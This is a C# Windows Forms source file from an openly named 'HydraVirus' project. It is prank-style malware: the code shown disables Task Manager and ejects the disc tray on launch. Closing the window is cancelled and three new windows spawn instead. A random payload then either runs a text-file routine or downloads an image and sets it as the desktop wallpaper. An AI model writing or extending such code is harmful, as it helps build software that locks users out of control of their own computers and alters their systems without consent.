using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static HydraVirus.WallpaperMgr;

namespace HydraVirus
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Payload Payload = new Payload();

            Payload.BlockTaskMgr();
            Payload.OpenDisck();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            Form2 frm2 = new Form2();
            frm2.Show();
            Form3 frm3 = new Form3();
            frm3.Show();
            Form4 frm4 = new Form4();
            frm4.Show();

            new Thread(() =>
            {
                RandomPayload();
            }).Start();
        }

        public void RandomPayload()
        {
            WallpaperMgr WallpaperMgr = new WallpaperMgr();
            TextFileMgr TextFileMgr = new TextFileMgr();
            Payload Payload = new Payload();

            Random rnd = new Random();
            int x = rnd.Next(1, 3);
            switch (x)
            {
                case 1:
                    TextFileMgr.TextMgr();
                    break;
                case 2:
                   try
                    {
                        string result = Path.GetTempPath();
                        using (WebClient webClient = new WebClient())
                        {
                            webClient.DownloadFile("https://wallpaperaccess.com/full/844221.jpg", string.Format(result + "\\844221.jpg", Guid.NewGuid().ToString()));
                        }
                        Set(result + "\\844221.jpg", Style.Stretched);
                    }
                    catch { }
                    break;
            }
        }
    }
}
